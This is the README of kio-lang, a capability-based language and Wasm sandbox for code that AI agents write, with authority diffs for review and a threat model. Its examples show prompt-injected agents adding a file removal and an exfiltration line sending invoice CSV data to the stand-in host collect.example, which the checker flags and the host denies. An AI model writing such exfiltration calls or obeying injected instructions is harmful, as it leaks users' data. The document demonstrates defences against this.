<p align="center"><img src="docs/assets/kio-unicorn.svg" width="180" alt="kio mascot: a unicorn whose horn is a key"></p>

# kio-lang

**Run AI-written code with exactly the authority you grant, and review each change by the authority it adds, not by its lines.**

kio is a small language for code agents write. What a program can touch is in its signature, the host enforces it, and `kio check --base` prints what a change adds: the safety you would otherwise assemble around Python or any general-purpose language (a sandbox, an egress proxy, a secret store, a review tool), built in.

## Why kio, not a general-purpose language?

- **"Can't I just sandbox Python?"** Yes, with work. On 55 prompt-injection attacks ([E3](docs/proposals/e3-scorecard.md)), Python sandboxed by a careful team stopped 52, the same as kio; it took an egress proxy that injects keys and filters methods, a sandbox profile per task and watchdogs. In kio that is flags on `kio run`.
- **"What does a reviewer read?"** In kio, the authority diff: 1-2 exact lines. In Python, the 80-90 line diff, and scanners guess.
- **"Can agents write it?"** It is a Rust subset on purpose. Given the primer (`kio mcp`), Haiku, Sonnet and Opus pass 42-43 of 45 backend tasks first try (Python: 39-45) and all 45 by try 5.
- **"What does it not do?"** Stop misuse of what you granted: a program that may read `customers/` and call `partner.example` can send one to the other. Few libraries yet, and agents spend about 2x the tokens writing it today.

| | kio | Python, careful sandbox | Python, common practice |
|---|---|---|---|
| Attacks stopped at run time ([E3](docs/proposals/e3-scorecard.md)) | 52/55 | 52/55 | 40/55 |
| What it took | flags on `kio run` | a proxy, profiles, watchdogs | a profile and a proxy |
| What a reviewer reads (median) | 1-2 lines | 80-90 lines | 80-90 lines |

Static analysis of Python or Rust cannot be sound without banning most of the language (`eval`, reflection, FFI, `unsafe`, build scripts, dependencies); containers are all or nothing per process and tell a reviewer nothing before the run.

## One change, reviewed

An agent writes a job: read today's orders, post them to the CRM ([examples/glance](examples/glance)). The signature is the whole of its authority.

```rust
fn main(orders: Dir, crm: Http) -> Result<Int, Str> {
  let csv = orders.read("today.csv").map_err(|_| "no orders")?;
  let r = crm.send("POST", "/v1/import", [], csv, 5000).map_err(|_| "crm down")?;
  Ok(r.status)
}
```

The operator grants exactly that: the orders read-only, one host, POST only, and a key the program never sees.

```
$ kio run sync.kio --dir orders=./orders:ro --http crm=api.crm.example \
    --http-methods crm=POST --http-header crm=Authorization:env:CRM_KEY
```

Next week an instruction hidden in a ticket makes the agent "archive the file after import". The reviewer reads one line, not the code:

```
$ kio check archive.kio --base sync.kio
~ orders: Dir (+remove)
authority added (exit 3); --detail lists each function
```

Shipped anyway, it does not start:

```
kio: `orders` is granted `:ro` but the program can write it (`orders remove`)
```

| To get this | kio | Python |
|---|---|---|
| Only `./orders`, read-only | `--dir orders=./orders:ro` | a sandbox profile or container mounts |
| Only `api.crm.example`, only POST | `--http`, `--http-methods` | an egress proxy with a method filter |
| A key the code never holds | `--http-header crm=Authorization:env:CRM_KEY` | a proxy that injects it |
| What a change adds | `kio check --base`, exact | read the diff; scanners guess |

## What is kio

- **Capabilities are parameters.** `main` names each resource it needs (`input: Dir`, `api: Http`, `db: Db`); the operator grants each one by a flag (or a [grants file](docs/guide.md)); there is no `import`, global or ambient I/O. A function without a capability parameter cannot do I/O, and the checker proves it.
- **The host is the boundary.** kio compiles to Wasm and runs in Wasmtime; the host enforces every grant again, with fuel, memory, time and call limits, and logs every call.
- **A real language.** Structs, enums, generics, closures, `match`, JSON; files, a key-value store, SQLite, HTTP client and server, WebSockets, HMAC, each a grant. Native code at 1.1-2.3x Rust on compute ([details](#what-works)).

## A closer look

Authority is per function, too. An agent converts invoices at the day's exchange rate:

```rust
fn summarize(csv: Str, eur: Float) -> List<Str> {
  csv.lines().map(|row| {
    let cols = row.split(",");
    let usd = cols[1].parse_int().unwrap_or(0).to_float();
    cols[0] + " " + (usd * eur + 0.5).to_int().unwrap_or(0).to_str() + " EUR"
  })
}

fn main(input: Dir, fx: Http, out: Dir) -> Result<List<Str>, Str> {
  let csv = input.read("invoices.csv").map_err(|_| "no invoices")?.to_str();
  let rates = fx.get("/v1/2026-01-02?from=USD&to=EUR").map_err(|_| "no rate")?;
  let json = rates.to_str().parse_json()?;
  let eur = json.get("rates").and_then(|r| r.get("EUR")).and_then(|r| r.as_float());
  let report = summarize(csv, eur.ok_or("no EUR rate")?);
  out.write("report.txt", report.join("\n").to_bytes()).map_err(|_| "cannot write")?;
  Ok(report)
}
```

```
$ kio check examples/fx/report.kio
main      : input read, fx get, out write
summarize : none
$ kio run examples/fx/report.kio --dir input=examples/in --http fx=api.frankfurter.dev --dir out=examples/tour/out
...
Ok(["acme 102 EUR", "globex 38 EUR", "initech 256 EUR"])
```

`summarize : none` is a proof, not a hint: a function with no capability parameter cannot do I/O. There is no `import`, no `std::net`, no global; the only way to the network is a parameter.


Say a document the agent read told it to "also back up the invoices". It adds one line, and passes the line the `fx` it needs ([examples/fx/leak.kio](examples/fx/leak.kio)):

```diff
-fn summarize(csv: Str, eur: Float) -> List<Str> {
+fn summarize(csv: Str, eur: Float, fx: Http) -> List<Str> {
+  let _sent = fx.get("https://collect.example/?d=" + csv);
-  let report = summarize(csv, eur.ok_or("no EUR rate")?);
+  let report = summarize(csv, eur.ok_or("no EUR rate")?, fx);
```

The report shows it before anything runs: a formatting helper now talks to the network.

```
$ kio check examples/fx/leak.kio
main      : input read, fx get, out write
summarize : fx get
```

In a pull request, the reviewer reads only what changed, and CI fails until someone approves it ([tools/authority-diff.sh](tools/authority-diff.sh)):

```
$ kio check examples/fx/leak.kio --base examples/fx/report.kio
+ summarize: fx get
authority added (exit 3)
```

Run anyway, the host refuses the call: `fx` is `api.frankfurter.dev` and nothing else. The audit log records the attempt.

```
$ kio run examples/fx/leak.kio --dir input=examples/in --http fx=api.frankfurter.dev --dir out=examples/tour/out --audit /tmp/leak.jsonl
...
$ grep denied /tmp/leak.jsonl
{"event":"call","seq":3,"cap":"fx","kind":"Http","method":"get","arg":"https://collect.example/?d=acme,120\u000aglobex,45\u000ainitech,300\u000a","bytes":0,"result":"denied","ms":0.0}
```

Reaching `collect.example` takes a grant only the operator can give (`--http`). The checker gives the early, readable answer; the host enforces every grant again, whether or not the checker was right.

## A real app

[links](https://github.com/danglangs/kio-web/tree/main/examples/links) is a link shortener in [kio-web](https://github.com/danglangs/kio-web): bearer-token auth (hashed, compared in constant time), links in a `Kv` that survives restarts, expiry, random slugs, a log of creates and deletes, a webhook after each create, an HTML page and static files, in 379 lines.

```rust
fn main(req: Incoming, res: Outgoing, links: Kv, auth: Kv, assets: Dir, links_rng: Rng, now: Clock, log: Log, hook: Http) -> Result<(), WebErr>
```

```
$ kio check app.kio | grep -v ': none' | grep -v '^web::\|^api::'
all_links           : links scan
authorized          : auth get
claim               : links delete swap
create              : links delete swap, rng int, clock now_ms, log write
delete              : links delete get, log write
follow              : links get, clock now_ms
...
notify              : hook send, log write
...
$ cat app.grants
--kv links=links.kv
--kv auth=auth.kv
--dir assets=./static
--rng links_rng
--clock now
--log log=links.log
--http hook=hooks.example
--http-methods hook=POST
--http-header hook=Authorization:env:HOOK_AUTH
--listen 127.0.0.1:8080
$ HOOK_AUTH='Bearer ...' kio run app.kio --grants app.grants
...
listening on http://127.0.0.1:8080
```

A redirect (`follow`) can only read links and the clock; auth can only read the token hash; nothing can write the token hash or write files, and only `notify` reaches the network: one host, POST only, with a key the host adds and the program never sees. With 301 links it serves 15,500 redirects/s and 13,200 listings/s (`ab -c 20`, Apple silicon), a fresh sandbox per request.

**Built by an agent, reviewed by authority.** [payhook](https://github.com/danglangs/kio-web/tree/main/examples/payhook) takes signed Stripe-style webhooks, drops replays in SQLite, and posts to a chat webhook with retries. A coding agent that read only kio's docs wrote it in five steps with no kio error; a reviewer approved each step from its diff, without reading the code:

```
step 2   + stripe: Hmac (verify)      + now: Clock (now_ms)     (verify only, never sign)
step 3   + db: Db (exec)              + log: Log (write)
step 4   + slack: Http (send_all)                               (one host, key injected)
step 5   ~ db: Db (+query)                                      (retries pending events)
```

The diffs say what the code can reach; the tests (124 checks) say what it does there. What each grant is, the operator's half, is [app.grants](https://github.com/danglangs/kio-web/tree/main/examples/payhook/app.grants), reviewed beside the code: `kio run app.kio --grants app.grants`, and in CI `kio check app.kio --grants app.grants` binds it to `main` without running or reading a key.

## Replay

Time and randomness are grants too, so fixing them makes a run reproducible:

```
$ kio run examples/raffle.kio --dir input=examples/in --rng r=seed:1 --clock now=fixed:2026-11-09T12:00:00Z --log log=/tmp/raffle.log --audit /tmp/raffle.jsonl
main : input read, r int, now now_ms, log write
Ok("globex wins at 1794225600000")
$ kio run examples/raffle.kio --dir input=examples/in --rng r=seed:1 --clock now=fixed:2026-11-09T12:00:00Z --log log=/tmp/raffle.log --audit /tmp/raffle.jsonl
main : input read, r int, now now_ms, log write
Ok("globex wins at 1794225600000")
$ grep '"call"' /tmp/raffle.jsonl | head -4
{"event":"call","seq":1,"cap":"input","kind":"Dir","method":"read","arg":"invoices.csv","bytes":31,"result":"ok","ms":0.7}
{"event":"call","seq":2,"cap":"r","kind":"Rng","method":"int","arg":"int","bytes":0,"result":"ok","lo":0,"hi":3,"ms":0.0}
{"event":"call","seq":3,"cap":"now","kind":"Clock","method":"now_ms","arg":"now_ms","bytes":0,"result":"ok","now":1794225600000,"ms":0.0}
{"event":"call","seq":4,"cap":"log","kind":"Log","method":"write","arg":"write","bytes":28,"result":"ok","ms":0.0}
```

## Quickstart

```
rustup target add wasm32-unknown-unknown
cargo install --git https://github.com/danglangs/kiolang kio
git clone https://github.com/danglangs/kiolang && cd kiolang
```

```
$ kio run examples/tour/hello.kio
hello, kio
```

Every flag, limit and output: [docs/guide.md](docs/guide.md).

## What works

v0, working end to end.

| | |
|---|---|
| Language | structs, enums, generics, closures, `match` with nested and `\|` patterns, `let`-else, constants, `Float`, `HashMap`, built-in JSON, SHA-256 |
| Resources, each a grant | files (`Dir`), a key-value store (`Kv`), SQLite (`Db`), an HTTP client (`Http`: any granted method, headers, parallel `send_all`), `Rng`, `Clock`, `Log`, `Hmac` (sign and verify under a key the program never holds); serving HTTP and WebSockets |
| Safety | the authority report before a run; a Wasm sandbox with fuel, memory, time, call and I/O limits; an audit log |
| Speed | compiled to native code through Wasm: 1.1-2.3x Rust on compute, 2.1-7.3x where it allocates; faster than Python on most benchmarks ([table](docs/roadmap.md#speed-today)) |

## Use from an agent

`kio mcp` is an MCP server on stdio with two tools: `kio_primer` (idioms, then the language reference) and `kio_check` (errors come back as `{file, line, message, hint}`). There is no run tool: grants are the operator's decision.

```json
{ "mcpServers": { "kio": { "command": "kio", "args": ["mcp"] } } }
```

Models write kio as well as Python. Given the language reference (what `kio_primer` serves), on 45 backend tasks ([eval/](eval/)):

| | kio, first try | kio, by try 5 | Python, first try | Python, by try 5 |
|---|---|---|---|---|
| Haiku 5.5 | 42/45 | 45/45 | 39/45 | 45/45 |
| Sonnet 5.5 | 43/45 | 45/45 | 44/45 | 45/45 |
| Opus 5.5 | 43/45 | 45/45 | 45/45 | 45/45 |

kio is a Rust subset on purpose, and its errors name the fix. Without the reference, models write full Rust and rarely finish: give agents the primer.

## Threat model

- **Adversary:** the agent writing the program: buggy, prompt-injected or malicious.
- **Defended:** the host machine, and every file and network host not granted to this run.
- **Not defended:** misuse of what was granted. A program that may read `customers/` and call `partner.example` can send the customers to the partner. kio does not track where data came from, and does not judge what an agent should be granted.

| # | Guarantee | Enforced by |
|---|---|---|
| G1 | No ambient authority: no I/O except through capability values | Checker, and Wasm links only the kio imports |
| G2 | Unforgeable capabilities: only as `main` parameters granted by the host | Checker, and the host handle table |
| G3 | Filesystem confinement: a `Dir` reaches only paths beneath its root | Host, via cap-std (`openat2` with `RESOLVE_BENEATH` on Linux) |
| G4 | Network allowlist: an `Http` reaches only granted hosts and methods | Host: rechecked on every redirect, IP literals refused, DNS pinned per run |
| G5 | Bounded execution: fuel, memory, host calls, I/O and wall-clock | Wasmtime fuel and epochs, per-call timeouts in the host |

## Roadmap

- **Now:** allocation speed (unboxed enums, small structs and borrowed loop variables are in; fewer string copies, inlining and per-loop fuel next).
- **Next:** packages (a module from another directory); `par_map` and tasks (pinned).
- **Later:** tuples, if the eval shows models still reach for them.

Where work stands: [docs/status.md](docs/status.md); concurrency: [docs/proposals/concurrency.md](docs/proposals/concurrency.md).

```
source ─► check + report ─► lower ─► IR ─┬─► codegen ─► Wasm + runtime ─► Cranelift ─► native code (`kio run`)
                                         └─► interpreter (native, tests only: the reference)
```

`lang` (parser, checker, lowering, interpreter; no dependencies), `codegen` and `runtime` (the compiler), `host` (the `kio` binary: Wasmtime, grants, limits), [caps.wit](caps.wit) (the sandbox interface).

## Docs

- [docs/guide.md](docs/guide.md): every grant, flag, limit and the audit log.
- [docs/language.md](docs/language.md): the language and the rules the checker enforces.
- [docs/design.md](docs/design.md): components, trust boundary, one run step by step.
- [docs/codegen.md](docs/codegen.md): how a checked program becomes Wasm.
- [docs/roadmap.md](docs/roadmap.md) and [docs/perf.md](docs/perf.md): speed against Rust and Python, server numbers; [bench/](bench/README.md) reruns them.
- [docs/status.md](docs/status.md), the `docs/*-todo.md` task lists and [docs/open_questions.md](docs/open_questions.md): how work proceeds. [CLAUDE.md](CLAUDE.md): how to work on kio.

## Related work

[TACIT](https://arxiv.org/abs/2603.00991) (tracked capabilities for agents, in Scala 3) and [Scala capture checking](https://docs.scala-lang.org/scala3/reference/experimental/cc.html) make capabilities first-class in an existing language; [Wyvern](https://wyvernlang.github.io/) and [Austral](https://austral-lang.org/) build languages around them; [second-class values](https://dl.acm.org/doi/10.1145/2983990.2984009) (Osvald et al., OOPSLA 2016) is the restriction v0 uses. kio runs on [Wasmtime](https://wasmtime.dev/) and [cap-std](https://github.com/bytecodealliance/cap-std).

## License

Licensed under either of [Apache License, Version 2.0](LICENSE-APACHE) or [MIT license](LICENSE-MIT) at your option. Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in this work, as defined in the Apache-2.0 license, shall be dual licensed as above, without any additional terms or conditions.
